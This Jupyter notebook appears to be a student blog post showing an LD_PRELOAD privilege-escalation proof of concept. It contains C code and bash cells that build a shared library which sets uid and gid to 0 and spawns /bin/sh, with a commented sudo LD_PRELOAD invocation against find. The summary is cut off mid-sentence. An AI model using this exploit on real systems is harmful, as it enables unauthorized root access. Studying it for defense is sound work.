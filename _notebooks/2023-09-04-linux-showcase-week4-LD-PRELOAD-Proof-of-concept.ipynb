{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "962e79f5",
   "metadata": {},
   "source": [
    "---\n",
    "title: LD_Preload trick 😈\n",
    "toc: True\n",
    "description: A proof of concept of how LD_Preload works and the different caviots. Showcases our understanding of the linux bash shell and commands and takes it one step further to understand lower-level linux knowledge\n",
    "courses: {'csp': {'week': 3}}\n",
    "type: hacks\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d56da22d",
   "metadata": {},
   "source": [
    "# Hi👋👋👋👋\n",
    "\n",
    "## So there's either two reasons your reading this:\n",
    "1. You randomly stumbled upon our blog because you were bored or\n",
    "2. Your Mr. Mortensen \n",
    "\n",
    "## So before we move on we will just give a little bit information about us:\n",
    "1. We're supper into linux internals especially understanding it from the first calls of syscalls and glibc interaction with linux \n",
    "![csse](../student/images/kernel.png)\n",
    "\n",
    "2. We've been competing in the field of computer science since a pretty young age. \n",
    "\n",
    "3. William has won multiple awards on both the national and state level for different competitions including fields with Cybersecurity and Hackathons.\n",
    "\n",
    "4. Saaras has been teaching python in order to raise money for Akshaya Patra an organization dedicated to feeding children around the globe. Saaras is also well versed in linux systems.\n",
    "\n",
    "## Ok so now that you know a little more on us let's talk about what this blog is for:\n",
    "1. Ok so obviously this blog is gonna show our understanding of basic linux commands and everything relating to the Linux Shell bash tutorial because obviously we want a good grade on the pair review. However, this is something we're both experienced in and thus we're going to a little bit more in the theory behind what this blog is for.\n",
    "\n",
    "## So now that that's out of the way, what're we doing 😈😈😈\n",
    "1. Mkay so linux has the use of shared libraries, what are shared libraries???\n",
    "\n",
    "### Shared Libraries\n",
    "- Understanding Shared Libraries: In Unix-like systems, many programs rely on shared libraries (also known as dynamic link libraries) to perform various tasks. These libraries contain precompiled functions that programs can use. When a program is executed, the dynamic linker/loader (ld.so or ld-linux.so in Linux) loads these libraries into memory and resolves function calls to the appropriate library functions. Whereas staticly loaded libraries are quite literally embedded within the acutal executable. \n",
    "\n",
    "- An attacker with sufficient permissions (typically root or a user with sudo privileges) can set the LD_PRELOAD environment variable to specify a malicious shared library that they control. They can do this by exporting the variable in their shell session or by modifying the environment of a specific process. \n",
    "\n",
    "- So what if a normal user were compromised that was granted the sudo access to one binary, maybe to run a specific binary as that person or simply for inconvience? Well we can preload a malicious library with those permissions and escalate our permissions to sudo. But keep in mind we also need the loader to preserver the environmental changes in order to ensure that our malicious library runs"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b39e4a13",
   "metadata": {},
   "source": [
    "## Exploit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2cc436bb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\n",
      "#include <sys/types.h>\n",
      "#include <stdlib.h>\n",
      "void _init() {\n",
      "unsetenv(\"LD_PRELOAD\");\n",
      "setgid(0);\n",
      "setuid(0);\n",
      "system(\"/bin/sh\");\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "%%script bash\n",
    "\n",
    "# Let's check if we have the necessary things to do this vuln (show terminal showcase as it lags out jupyternotebook cell)\n",
    "cd /tmp\n",
    "cat <<EOF > /tmp/ldp.c\n",
    "#include <stdio.h>\n",
    "#include <sys/types.h>\n",
    "#include <stdlib.h>\n",
    "void _init() {\n",
    "unsetenv(\"LD_PRELOAD\");\n",
    "setgid(0);\n",
    "setuid(0);\n",
    "system(\"/bin/sh\");\n",
    "}\n",
    "EOF\n",
    "\n",
    "#Let's see what is in here now\n",
    "cat /tmp/ldp.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "bd6f5024",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ldp.c: In function ‘_init’:\n",
      "/tmp/ldp.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]\n",
      "    6 | setgid(0);\n",
      "      | ^~~~~~\n",
      "/tmp/ldp.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]\n",
      "    7 | setuid(0);\n",
      "      | ^~~~~~\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\n",
      "#include <sys/types.h>\n",
      "#include <stdlib.h>\n",
      "void _init() {\n",
      "unsetenv(\"LD_PRELOAD\");\n",
      "setgid(0);\n",
      "setuid(0);\n",
      "system(\"/bin/sh\");\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "%%script bash\n",
    "# Compiling the ldp.so into a library and dynamic load it into the LD_PRELOAD\n",
    "gcc -fPIC -shared -o /tmp/ldp.so /tmp/ldp.c -nostartfiles\n",
    "cat /tmp/ldp.c\n",
    "#sudo LD_PRELOAD=/tmp/ldp.so /usr/bin/find\n",
    "#i'll show case the end of what happens :)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6091192a",
   "metadata": {},
   "source": [
    "# Summary\n",
    "- Basically what you should get away of this is NEVER EVER preserve your environmental variables because this allows for just people who have mini "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
